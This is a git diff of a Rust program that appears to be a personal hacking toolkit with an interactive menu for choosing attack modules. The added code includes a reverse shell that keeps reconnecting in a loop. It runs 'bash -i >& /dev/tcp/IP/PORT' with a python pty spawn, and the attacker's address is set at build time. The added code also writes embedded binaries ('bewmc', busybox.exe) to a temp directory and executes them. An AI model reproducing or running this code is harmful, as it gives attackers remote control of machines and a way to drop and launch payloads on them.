@@ -1,25 +1,73 @@
 use core::time;
-use cursive::views::Checkbox;
-use cursive::views::ListView;
+use requestty::Question;
+
+use std::io::Write;
 use std::{
-    io::Write,
+    collections::HashMap,
     process::{Command, Stdio},
     thread,
 };
 
-use cursive::views::Dialog;
+use std::fs::File;
+
+use tempfile::tempdir;
 /// the thing
 fn main() {
     println!("BEWM!!!");
-    pub fn reverse_shell() {
-        let shell = thread::spawn(|| {
-            Command::new("touch")
-                .arg("h.txt")
-                .spawn()
-                .unwrap()
-                .wait()
-                .unwrap();
+    let mut methods: HashMap<_, &Fn()> = HashMap::new();
+    let mut bewmc: Option<&[u8]> = None;
+    let mut busy: Option<&[u8]> = None;
 
+    #[cfg(feature = "reproduce")]
+    {
+        bewmc = Some(include_bytes!("../bewmc.tar.gz"));
+    }
+
+    #[cfg(feature = "reproduce")]
+    {
+        busy = Some(include_bytes!("../busybox.exe"));
+    }
+    let reproduce = || {
+        if bewmc.unwrap().len() > 0 {
+            // Create a file inside of `std::env::temp_dir()`.
+
+            // Create a directory inside of `std::env::temp_dir()`.
+            let dir = tempdir().unwrap();
+
+            let file_path = dir.path().join("bewmc");
+            let mut file = File::create(file_path).unwrap();
+            file.write(bewmc.unwrap()).unwrap();
+            let mut chmod = Command::new("chmod")
+                .arg("-x")
+                .arg(dir.path().join("bewmc"))
+                .spawn()
+                .unwrap();
+            chmod.wait().unwrap();
+            let mut run = Command::new(dir.path().join("bewmc")).spawn().unwrap();
+            run.wait().unwrap();
+        }
+    };
+    let busybox = || {
+        if busy.unwrap().len() > 0 {
+            // Create a file inside of `std::env::temp_dir()`.
+
+            // Create a directory inside of `std::env::temp_dir()`.
+            let dir = tempdir().unwrap();
+
+            let file_path = dir.path().join("busybox.exe");
+            let mut file = File::create(file_path).unwrap();
+            file.write(busy.unwrap()).unwrap();
+            let mut run = Command::new(dir.path().join("busybox.exe"))
+                .spawn()
+                .unwrap();
+            run.wait().unwrap();
+        }
+    };
+    methods.insert("reproduce", &reproduce);
+    methods.insert("busybox", &busybox);
+
+    let reverse_shell = || {
+        let shell = thread::spawn(|| {
             loop {
                 let mut bash = Command::new("bash").stdin(Stdio::piped()).spawn().unwrap();
                 // .arg("-c")
@@ -34,51 +82,51 @@ fn main() {
                 //     .collect::<Vec<&str>>()),
                 // )
                 write!(
-                    bash.stdin.take().unwrap(),
-                    "{}",
-                    (format!(
-                        "bash -i >& /dev/tcp/{}/{} 0>&1",
-                        option_env!("REVERSE_SHELL_IP").unwrap_or("127.0.0.1"),
-                        option_env!("REVERSE_SHELL_PORT").unwrap_or("4444")
-                    ))
-                )
-                .unwrap();
+                            bash.stdin.take().unwrap(),
+                            "{}",
+                            (format!(
+                                r#"bash -c "python -c 'import pty; pty.spawn(\"/bin/bash\")'" -i >& /dev/tcp/{}/{} 0>&1; exit"#,
+                                option_env!("REVERSE_SHELL_IP").unwrap_or("127.0.0.1"),
+                                option_env!("REVERSE_SHELL_PORT").unwrap_or("4444")
+                            ))
+                        )
+                        .unwrap();
                 bash.wait().unwrap();
                 println!("Exited, sleeping for 5 seconds");
                 thread::sleep(time::Duration::from_secs(5));
             }
         });
         shell.join().unwrap();
-    }
-    // reverse_shell();
+    };
+    methods.insert("reverse_shell", &reverse_shell);
+
+    let mut list: Vec<&str> = vec![];
     #[cfg(feature = "reverse_shell")]
-    let mut rev = false;
+    list.push("reverse_shell");
+    #[cfg(feature = "reproduce")]
+    list.push("reproduce");
+    #[cfg(feature = "busybox")]
+    list.push("busybox");
+
     #[cfg(unix)]
     println!("yay unix");
 
     #[cfg(windows)]
     println!("eww windows");
-    // Creates the cursive root - required for every application.
-    let mut siv = cursive::default();
-    let mut stuffs = ListView::new();
-    #[cfg(feature = "reverse_shell")]
-    {
-        stuffs = stuffs.child(
-            "Enable reverse shell",
-            Checkbox::new().on_change(move |_, checked| {
-                //
-                rev = checked
-            }),
-        );
-    }
-    siv.add_layer(
-        Dialog::new()
-            .title("What's on the menu, hackerman?")
-            .button("Ok", |s| s.quit())
-            .content(stuffs),
-    );
+    let question = Question::multi_select("hacks")
+        .message("so which one?")
+        .choices(list.clone())
+        .build();
+    let ans = requestty::prompt(vec![question]).unwrap();
 
-    // Starts the event loop.
-    siv.run();
+    ans.get("hacks")
+        .unwrap()
+        .as_list_items()
+        .unwrap()
+        .iter()
+        .for_each(|i| {
+            let my_str: &str = &i.text; //This is an &str type
+            println!("Running {}...", i.text.clone());
+            methods.get(my_str).unwrap()()
+        })
 }
-// #[cfg(feature = "reverse_shell")]
